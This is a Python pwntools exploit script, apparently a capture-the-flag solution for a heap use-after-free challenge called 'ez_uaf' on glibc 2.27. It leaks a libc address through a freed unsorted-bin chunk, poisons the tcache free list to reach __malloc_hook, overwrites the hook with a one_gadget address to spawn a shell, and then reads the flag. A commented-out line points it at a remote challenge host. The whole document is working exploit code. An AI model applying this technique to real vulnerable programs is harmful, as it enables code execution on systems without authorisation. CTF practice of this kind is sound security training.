from pwn import *
context.log_level = 'debug'
io = gdb.debug('./ez_uaf')
# io = remote('node5.anna.nssctf.cn',27870)
elf = ELF('./ez_uaf')
lib = ELF('/home/bamuwe/pwn_tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')
def add(size,name,content):
    io.sendlineafter(b'Choice: \n',b'1')
    io.sendlineafter(b'Size:\n',str(int(size)))
    io.sendafter(b'Name: \n',name)
    io.sendafter(b'Content:\n',content)

def free(idx):
    io.sendlineafter(b'Choice: \n',b'2')
    io.sendlineafter(b'idx:\n',str(int(idx)))

def show(idx):
    io.sendlineafter(b'Choice: \n',b'3')
    io.sendlineafter(b'idx:\n',str(int(idx)))
    
def edit(idx,content):
    io.sendlineafter(b'Choice: \n',b'4')
    io.sendlineafter(b'idx:\n',str(int(idx)))
    io.send(content)
    
add(0x410,b'a',b'a')    #0
add(0x20,b'b',b'1111')  #1
add(0x10,b'c',b'c')     #2
free(0)                                         #unsortbin指向自身
show(0)
#leak_libc
io.recvuntil(b'\n')
malloc_hook_addr = u64(io.recv(6).ljust(8,b'\x00'))-96-16
success(f'malloc_hook_addr=> {hex(malloc_hook_addr)}')
lib_offset = malloc_hook_addr - lib.sym['__malloc_hook']
one_gadgets_addr = 0x10a2fc+lib_offset

free(1)
edit(1,p64(malloc_hook_addr))       # 修改fd
add(0x10,b'2',b'2')     #3          #绕过tcachebin          
add(0x20,b'3',b'3')     #4        #fake_chunk,地址为malloc_hook_addr
edit(4,p64(one_gadgets_addr))

io.sendlineafter(b'Choice: \n',b'1')
io.sendlineafter(b'Size:\n',b'0x20')
io.sendline(b'cat flag')

io.interactive()